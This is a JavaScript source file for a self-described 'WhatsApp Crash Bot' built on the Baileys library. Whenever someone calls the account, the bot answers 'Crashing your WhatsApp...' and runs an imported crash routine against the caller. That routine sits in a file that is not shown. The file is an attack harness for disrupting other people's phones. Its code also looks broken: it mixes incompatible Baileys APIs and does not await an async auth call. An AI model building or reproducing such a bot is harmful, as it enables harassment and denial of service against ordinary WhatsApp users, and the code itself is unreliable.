javascript
const { state, saveState, WAConnection, useMultiFileAuthState, DisconnectReason } = require('@adiwajshing/baileys');
const { state: State, saveCreds } = useMultiFileAuthState('./auth_info');
const express = require('express');
const app = express();
const port = 3000;
const handler = require('./handler');
const crash = require('./crash');

app.get('/', (req, res) => {
  res.send('WhatsApp Crash Bot is running');
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});

const start = async () => {
  const conn = new WAConnection();
  conn.on('open', () => {
    console.log('Connected to WhatsApp');
  });

  conn.on('close', async (reason) => {
    if (reason === DisconnectReason.loggedOut) {
      console.log('Connection closed. Reconnecting...');
      start();
    } else if (reason === DisconnectReason.connectionClosed) {
      start();
    }
  });

  conn.on('CB:call', async (json) => {
    const { from, id } = json[0];
    await conn.sendMessage(from, { text: 'Crashing your WhatsApp...' });
    crash(conn, from);
  });

  conn.on('CB:blocklist', async (json) => {
    const { from, block } = json[0];
    if (block) {
      await conn.sendMessage(from, { text: 'You have been blocked!' });
    }
  });

  conn.on('CB:message', async (message) => {
    handler(conn, message);
  });

  await conn.connect({ auth: State });
  await conn.sendMessage(conn.user.id, { text: 'Bot is ready!' });
};

start();
